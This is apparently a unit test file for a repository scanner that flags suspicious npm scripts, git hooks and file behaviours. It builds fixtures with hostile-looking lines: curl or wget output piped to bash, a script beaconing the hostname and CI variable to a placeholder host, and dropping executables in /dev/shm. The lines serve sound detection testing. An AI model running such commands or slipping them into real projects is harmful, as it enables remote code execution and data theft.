'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { scanRepository } = require('../../src/core/repositoryScanner');

const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-repository-unit-'));
function fixture(name, files) {
  const root = path.join(parent, name);
  fs.mkdirSync(root);
  for (const [file, text] of Object.entries(files)) {
    const target = path.join(root, file);
    fs.mkdirSync(path.dirname(target), { recursive: true });
    fs.writeFileSync(target, text);
  }
  return root;
}
function scan(root, options = {}) { return scanRepository({ roots: [root], ...options }); }

try {
  const existing = fixture('existing', {
    'package.json': '{\n "description": "node canary.js",\n "scripts": {\n  "build": "node canary.js",\n  "prepare": "node canary.js"\n }\n}',
    'canary.js': "console.log('legitimate canary test');\n",
  });
  let result = scan(existing);
  assert.strictEqual(result.complete, true);
  assert.deepStrictEqual(result.references.map(r => [r.status, r.line]), [['exists', 4], ['exists', 5]]);
  assert.ok(result.findings.every(f => f.severity === 'indicator'));
  assert.ok(result.findings.some(f => f.path === path.join(existing, 'canary.js')));

  const missing = fixture('missing', {
    'package.json': '{\n "scripts": {"build": "node deleted/canary.js", "prepare": "sh missing.sh"}\n}',
  });
  result = scan(missing);
  assert.strictEqual(result.complete, false);
  assert.deepStrictEqual(result.references.map(r => r.status), ['missing', 'missing']);
  assert.ok(result.unresolved.every(r => r.line === 2 && r.evidence.includes('deleted/canary.js')));

  const renamed = fixture('renamed', {
    'package.json': JSON.stringify({ scripts: { build: 'node payload.data', prepare: 'sh setup.sh' } }),
    'payload.data': "const os = require('os');\nconst data = os.hostname() + process.env.CI;\nfetch('https://example.invalid/beacon', {body: data});\n",
    'setup.sh': '#!/bin/sh\ncurl https://example.invalid/x | bash\nprintf test > recreated.js\nchmod +x recreated.js\n',
  });
  result = scan(renamed);
  assert.ok(result.findings.some(f => f.name === 'outbound-collection' && f.path.endsWith('payload.data') && f.line === 2));
  assert.ok(result.findings.some(f => f.name === 'remote-to-shell' && f.line === 2));
  assert.ok(result.findings.some(f => f.name === 'executable-recreation' && f.line === 3));
  assert.ok(!result.findings.some(f => f.name === 'canary-indicator'));

  const hooks = fixture('hooks', {
    '.git/config': '[core]\n hooksPath = custom-hooks\n fsmonitor = do-not-execute\n diff.external = do-not-execute\n[include]\n path = extra-config\n',
    '.git/extra-config': '[core]\n hooksPath = more-hooks\n',
    '.git/hooks/pre-commit': '#!/bin/sh\nnode deleted/canary.js\n',
    'custom-hooks/pre-push': '#!/bin/sh\nnode present.js\ncurl https://example.invalid/h | sh\n',
    'more-hooks/post-checkout': '#!/bin/sh\nnode another-missing.js\n',
    'present.js': 'console.log("harmless");',
  });
  result = scan(hooks);
  assert.strictEqual(result.coverage.gitConfigs.length, 2);
  assert.strictEqual(result.coverage.hookDirectories.length, 3);
  assert.ok(result.references.some(r => r.path.endsWith('pre-push') && r.status === 'exists'));
  assert.ok(result.references.some(r => r.path.endsWith('pre-commit') && r.status === 'missing' && r.line === 2));
  assert.ok(result.findings.some(f => f.path.endsWith('pre-push') && f.line === 3 && f.name === 'remote-to-shell'));

  const hookOrder = fixture('hook-order', {
    'hooks # local/pre-commit': '#!/bin/sh\nnode present.js\n',
    'include-before-config': '[core]\n hooksPath = "hooks # local" # trailing comment\n',
    'present.js': 'console.log("ok");',
    '.git/config': '[include]\n path = ../include-before-config\n',
  });
  result = scan(hookOrder, { roots: [path.join(hookOrder, 'hooks # local'), path.join(hookOrder, 'include-before-config'), hookOrder] });
  assert.ok(result.references.some(r => r.path.endsWith('pre-commit') && r.status === 'exists' && r.target === path.join(hookOrder, 'present.js')));
  assert.strictEqual(result.coverage.gitConfigs.length, 2);

  const versionedHooks = fixture('versioned-hooks', {
    '.husky/pre-commit': '#!/bin/sh\nnode deleted/canary.js\n',
    'package.json': '{}',
  });
  result = scan(versionedHooks);
  assert.ok(result.references.some(r => r.target === path.join(versionedHooks, 'deleted', 'canary.js') && r.status === 'missing'));

  const shellForms = fixture('shell-forms', {
    'quoted script.js': 'console.log("ok");',
    'package.json': JSON.stringify({ scripts: {build: 'env MODE=test node "quoted script.js"'} }),
    'commands.txt': 'curl \\\n https://example.invalid/x | sudo /usr/bin/bash\nbash <(wget -qO- https://example.invalid/x)\ncurl -o fetched https://example.invalid/x; sh fetched\n',
    'node-download.js': 'fetch("https://example.invalid/x");\nspawn("bash", [payload]);\n',
    'dynamic.js': 'console.log("ok");\nimport ( variable );\n',
    'missing-import.js': 'require("./deleted/canary.js");\n',
    'recreate.js': 'fs.writeFileSync("/dev/shm/renamed", content);\nfs.chmodSync("/dev/shm/renamed", 0o755);\n',
    'esm-beacon.mjs': 'import h from "node:https";\nconst host = os.hostname();\nh.get(url);\n',
  });
  result = scan(shellForms);
  assert.ok(result.references.some(r => r.reference === 'quoted script.js' && r.status === 'exists'));
  assert.ok(result.findings.some(f => f.path.endsWith('commands.txt') && f.name === 'remote-to-shell' && f.line === 1));
  assert.ok(result.findings.some(f => f.path.endsWith('commands.txt') && f.name === 'remote-to-shell' && f.line === 3));
  assert.ok(result.findings.some(f => f.path.endsWith('commands.txt') && f.name === 'remote-to-shell' && f.line === 4));
  assert.ok(result.findings.some(f => f.name === 'remote-shell-primitives' && f.line === 2));
  assert.ok(result.unresolved.some(r => r.path.endsWith('dynamic.js') && r.line === 2));
  assert.ok(result.references.some(r => r.path.endsWith('missing-import.js') && r.status === 'missing'));
  assert.ok(result.findings.some(f => f.path.endsWith('recreate.js') && f.name === 'executable-recreation' && f.line === 1));
  assert.ok(result.findings.some(f => f.path.endsWith('esm-beacon.mjs') && f.name === 'outbound-collection' && f.line === 2));

  if (process.platform === 'win32') {
    const windows = fixture('windows-paths', {
      'package.json': JSON.stringify({ scripts: {build: 'node .\\canary.js'} }),
      'canary.js': 'console.log("ok");',
    });
    assert.strictEqual(scan(windows).references[0].status, 'exists');
  }

  const nonstandard = fixture('nonstandard', { 'package.jsonl': '{"scripts":{"build":"node nonexistent.js"}}' });
  result = scan(nonstandard);
  assert.strictEqual(result.references.length, 0);
  assert.strictEqual(result.findings[0].name, 'nonstandard-manifest');

  const temp = fixture('dev-shm', { 'canary.js': 'console.log("temporary test");' });
  result = scan(existing, { roots: [existing, temp] });
  assert.ok(result.coverage.files.includes(path.join(temp, 'canary.js')));
  result = scan(existing, { excludes: [path.join(existing, 'canary.js')] });
  assert.strictEqual(result.complete, false);
  assert.ok(result.exclusions.some(r => r.reason === 'Explicit path exclusion'));
  result = scan(existing, { limits: { fileBytes: 8 } });
  assert.strictEqual(result.complete, false);
  assert.ok(result.exclusions.some(r => r.reason.includes('limit')));
  result = scan(existing, { limits: { entries: 1 } });
  assert.strictEqual(result.complete, false);
  assert.ok(result.exclusions.some(r => r.reason.includes('Traversal')));
  result = scan(renamed, { limits: { records: 1 } });
  assert.strictEqual(result.complete, false);
  assert.ok(result.unresolved.some(r => r.reason.includes('record limit')));

  const invalid = fixture('invalid', { 'package.json': '{invalid', 'binary': Buffer.from([0, 1, 2]) });
  result = scan(invalid);
  assert.strictEqual(result.complete, false);
  assert.ok(result.unreadable.some(r => r.reason.includes('package.json')));
  assert.ok(result.exclusions.some(r => r.reason.includes('Binary')));
  result = scan(path.join(parent, 'absent'));
  assert.strictEqual(result.complete, false);
  assert.ok(result.unreadable.some(r => r.reason === 'ENOENT'));

  const unreadablePath = path.join(existing, 'canary.js');
  const originalLstat = fs.lstatSync;
  fs.lstatSync = function(target, ...args) {
    if (target === unreadablePath) throw Object.assign(new Error('fixture permission denied'), { code: 'EACCES' });
    return originalLstat.call(fs, target, ...args);
  };
  try {
    result = scan(existing);
    assert.strictEqual(result.complete, false);
    assert.ok(result.unreadable.some(r => r.path === unreadablePath && r.reason === 'EACCES'));
  } finally { fs.lstatSync = originalLstat; }

  const dynamic = fixture('dynamic', {
    'package.json': JSON.stringify({ scripts: { build: 'node "$SCRIPT"', test: 'npm run test:canary' } }),
    '.git/config': '[includeIf "gitdir:/any/"]\n path = alternate-config\n[core]\n hooksPath = ../outside-hooks\n',
    'main.js': 'require(variable);\nimport("./absent.js");\n',
  });
  result = scan(dynamic);
  assert.strictEqual(result.complete, false);
  assert.ok(result.unresolved.some(r => r.reason.includes('Conditional')));
  assert.ok(result.unresolved.some(r => r.reason.includes('Outside')));
  assert.ok(result.unresolved.some(r => r.reason.includes('Dynamic JavaScript')));

  const linked = fixture('linked', { 'ordinary.js': 'console.log("ok");' });
  try {
    fs.symlinkSync(existing, path.join(linked, 'link'), process.platform === 'win32' ? 'junction' : 'dir');
    result = scan(linked);
    assert.strictEqual(result.complete, false);
    assert.ok(result.exclusions.some(r => r.reason.includes('Symbolic link')));
    assert.ok(!result.coverage.files.includes(path.join(linked, 'link', 'canary.js')));
  } catch (err) {
    if (!['EPERM', 'EACCES', 'ENOSYS'].includes(err.code)) throw err;
    console.log('  SKIP repository symlink fixture: OS permission unavailable');
  }

  const pointer = fixture('pointer', { '.git': 'gitdir: ../git-metadata\n' });
  const metadata = fixture('git-metadata', {
    config: '[core]\n hooksPath = ../pointer/hooks\n',
    'hooks/pre-commit': '#!/bin/sh\nnode gone.js\n',
  });
  result = scan(pointer, { roots: [pointer, metadata] });
  assert.ok(result.coverage.gitConfigs.some(r => r.path === path.join(metadata, 'config')));
  assert.ok(result.references.some(r => r.path.endsWith('pre-commit') && r.target === path.join(pointer, 'gone.js')));
  assert.ok(result.references.some(r => r.path === path.join(pointer, '.git') && r.status === 'exists' && r.line === 1));

  const common = fixture('common-pointer', { '.git/commondir': '../../git-metadata\n' });
  result = scan(common, { roots: [common, metadata] });
  assert.ok(result.references.some(r => r.path.endsWith('commondir') && r.target === metadata && r.status === 'exists'));

  const childProcess = require('child_process');
  const http = require('http');
  const https = require('https');
  const intercepted = [];
  let calls = 0;
  for (const [module, name] of [[childProcess, 'spawnSync'], [childProcess, 'execSync'], [childProcess, 'spawn'], [http, 'request'], [https, 'request'], [https, 'get']]) {
    intercepted.push([module, name, module[name]]);
    module[name] = () => { calls++; throw new Error('External execution/network prohibited in scan'); };
  }
  try {
    scan(hooks);
    scan(renamed);
    assert.strictEqual(calls, 0, 'Scan must not invoke subprocesses or HTTP clients');
  } finally { for (const [module, name, original] of intercepted) module[name] = original; }

  console.log('  repositoryScanner: targets, indicators, behaviors, hooks, roots and incomplete coverage passed');
} finally { fs.rmSync(parent, { recursive: true, force: true }); }
